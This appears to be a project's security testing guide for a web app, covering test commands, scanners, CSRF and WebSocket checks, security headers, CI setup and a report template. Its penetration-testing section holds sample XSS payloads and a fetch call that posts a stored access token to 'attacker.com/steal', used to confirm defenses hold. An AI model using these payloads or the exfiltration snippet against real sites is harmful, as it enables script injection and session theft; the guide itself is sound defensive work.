# Security Testing Guide

## Overview

Comprehensive security testing guide for Week 2 implementations.

---

## Automated Testing

### Unit Tests

```bash
# Run all security tests
npm test -- __tests__/security/

# Run specific test suites
npm test -- __tests__/security/auth.test.ts
npm test -- __tests__/security/sanitize.test.ts
npm test -- __tests__/security/csrf.test.ts
npm test -- __tests__/security/websocket.test.ts
npm test -- __tests__/security/logger.test.ts
npm test -- __tests__/security/token-refresh.test.ts

# Run with coverage
npm test -- __tests__/security/ --coverage
```

### Integration Tests

```bash
# Test authentication flow
npm test -- __tests__/integration/auth-flow.test.ts

# Test WebSocket connection
npm test -- __tests__/integration/websocket-flow.test.ts
```

---

## Manual Testing

### 1. WebSocket Security

#### Test WSS Enforcement
```javascript
// Open browser console
const ws = new WebSocket('ws://your-domain.com/ws/test');
// Should automatically upgrade to wss:// in production
```

#### Test Token Not in URL
```bash
# Check WebSocket connection in Network tab
# URL should NOT contain: ?token=, &token=, Bearer
```

#### Test Authentication
```javascript
// WebSocket should send auth message after connection
// Check Network tab -> WS -> Messages
// Should see: {"type":"auth","timestamp":"..."}
```

---

### 2. Token Refresh

#### Test Automatic Refresh
```javascript
// 1. Log in
// 2. Wait 10 minutes (or adjust refresh time)
// 3. Check Network tab for refresh request
// Should see: POST /api/auth/refresh
```

#### Test Refresh on 401
```javascript
// 1. Make API call
// 2. If 401, should automatically refresh
// 3. Should retry original request
```

#### Test Token Expiry
```javascript
// 1. Wait for token to expire
// 2. Should redirect to login
// 3. Check console for "Token expired" message
```

---

### 3. Secure Logging

#### Test Data Sanitization
```javascript
import { logger } from '@/lib/logger';

// Test password redaction
logger.info('User login', {
  email: 'test@example.com',
  password: 'secret123' // Should be [REDACTED]
});

// Test token redaction
logger.info('API call', {
  headers: {
    Authorization: 'Bearer eyJhbGci...' // Should be [REDACTED]
  }
});

// Check console - sensitive data should be redacted
```

#### Test Log Levels
```javascript
// In production, only warn and error should log
logger.debug('Debug message'); // Should not appear
logger.info('Info message');   // Should not appear
logger.warn('Warning');         // Should appear
logger.error('Error');          // Should appear
```

---

## Security Scanning

### 1. OWASP ZAP Scan

```bash
# Install OWASP ZAP
# https://www.zaproxy.org/download/

# Run automated scan
zap-cli quick-scan --self-contained \
  --start-options '-config api.disablekey=true' \
  https://your-domain.com

# Run full scan
zap-cli active-scan --recursive \
  https://your-domain.com
```

### 2. npm audit

```bash
# Check for vulnerable dependencies
npm audit

# Fix vulnerabilities
npm audit fix

# Force fix (may break things)
npm audit fix --force
```

### 3. Snyk Scan

```bash
# Install Snyk
npm install -g snyk

# Authenticate
snyk auth

# Test for vulnerabilities
snyk test

# Monitor project
snyk monitor
```

---

## Penetration Testing

### 1. XSS Testing

#### Test HTML Sanitization
```javascript
// Try injecting scripts in chat
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

// All should be sanitized and not execute
```

#### Test DOM-based XSS
```javascript
// Try manipulating URL parameters
https://your-domain.com/?search=<script>alert('XSS')</script>

// Should be sanitized
```

---

### 2. CSRF Testing

#### Test Without Token
```bash
# Try POST without CSRF token
curl -X POST https://your-domain.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}'

# Should return: 403 Forbidden
```

#### Test With Invalid Token
```bash
# Try POST with invalid CSRF token
curl -X POST https://your-domain.com/api/auth/login \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: invalid_token" \
  -d '{"email":"test@test.com","password":"test"}'

# Should return: 403 Forbidden
```

---

### 3. Authentication Testing

#### Test Token in localStorage
```javascript
// Check localStorage
console.log(localStorage.getItem('access_token'));
// Should be: null

// Check cookies
document.cookie.split(';').forEach(c => console.log(c));
// Should see: access_token with HttpOnly flag
```

#### Test Session Hijacking
```javascript
// Try to steal token
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: localStorage.getItem('access_token')
});
// Should send: null (no token in localStorage)
```

---

### 4. WebSocket Testing

#### Test Token Leakage
```bash
# Check server logs for WebSocket connections
# Should NOT see tokens in URLs
grep "token=" /var/log/nginx/access.log
# Should return: no matches
```

#### Test WSS Enforcement
```bash
# Try connecting with ws:// in production
# Should automatically upgrade to wss://
```

---

## Security Headers Testing

### Test CSP
```bash
# Check Content-Security-Policy header
curl -I https://your-domain.com | grep -i content-security-policy

# Expected:
# Content-Security-Policy: default-src 'self'; ...
```

### Test HSTS
```bash
# Check Strict-Transport-Security header
curl -I https://your-domain.com | grep -i strict-transport-security

# Expected:
# Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### Test All Headers
```bash
# Check all security headers
curl -I https://your-domain.com

# Should see:
# - Content-Security-Policy
# - Strict-Transport-Security
# - X-Frame-Options: DENY
# - X-Content-Type-Options: nosniff
# - X-XSS-Protection: 1; mode=block
# - Referrer-Policy
# - Permissions-Policy
```

---

## Performance Testing

### Test Token Refresh Impact
```bash
# Measure API response time with token refresh
# Should add < 100ms overhead
```

### Test Logging Impact
```bash
# Measure logging overhead
# Should add < 5ms per log entry
```

### Test WebSocket Reconnection
```bash
# Simulate network interruption
# Should reconnect within 5 seconds
```

---

## Compliance Testing

### OWASP Top 10 Checklist

- [x] A01: Broken Access Control - Fixed with proper auth
- [x] A02: Cryptographic Failures - Fixed with HttpOnly cookies
- [x] A03: Injection (XSS) - Fixed with DOMPurify
- [x] A05: Security Misconfiguration - Fixed with CSP
- [x] A07: Auth Failures - Fixed with token refresh

### PCI DSS Checklist

- [x] 6.5.7: XSS Prevention - DOMPurify implemented
- [x] 8.2: Session Management - Token refresh implemented
- [ ] 10: Audit Logging - Secure logging implemented (needs backend)

---

## Continuous Testing

### GitHub Actions

```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm install
      - run: npm audit
      - run: npm test -- __tests__/security/
      - run: npx snyk test
```

### Pre-commit Hooks

```bash
# Install husky
npm install --save-dev husky

# Add pre-commit hook
npx husky add .husky/pre-commit "npm test -- __tests__/security/"
```

---

## Reporting

### Security Test Report Template

```markdown
# Security Test Report

**Date:** YYYY-MM-DD
**Tester:** Name
**Environment:** Production/Staging

## Test Results

### Automated Tests
- Unit Tests: PASS/FAIL
- Integration Tests: PASS/FAIL
- Security Scan: PASS/FAIL

### Manual Tests
- XSS Testing: PASS/FAIL
- CSRF Testing: PASS/FAIL
- Auth Testing: PASS/FAIL
- WebSocket Testing: PASS/FAIL

### Vulnerabilities Found
1. [Severity] Description
2. [Severity] Description

### Recommendations
1. Action item
2. Action item

## Sign-off
Tested by: ___________
Approved by: ___________
```

---

## Emergency Response

### If Vulnerability Found

1. **Assess Severity**
   - Critical: Immediate action
   - High: Fix within 24 hours
   - Medium: Fix within 1 week
   - Low: Fix in next sprint

2. **Isolate Issue**
   - Disable affected feature if critical
   - Add temporary mitigation

3. **Fix and Test**
   - Implement fix
   - Run full security test suite
   - Verify fix in staging

4. **Deploy**
   - Deploy to production
   - Monitor for issues
   - Document incident

5. **Post-Mortem**
   - Analyze root cause
   - Update security procedures
   - Train team

---

## Resources

### Tools
- **OWASP ZAP**: https://www.zaproxy.org/
- **Burp Suite**: https://portswigger.net/burp
- **Snyk**: https://snyk.io/
- **npm audit**: Built-in to npm

### Documentation
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **PCI DSS**: https://www.pcisecuritystandards.org/
- **NIST Guidelines**: https://www.nist.gov/cyberframework

---

**Last Updated:** 2025-10-26
**Next Review:** Weekly
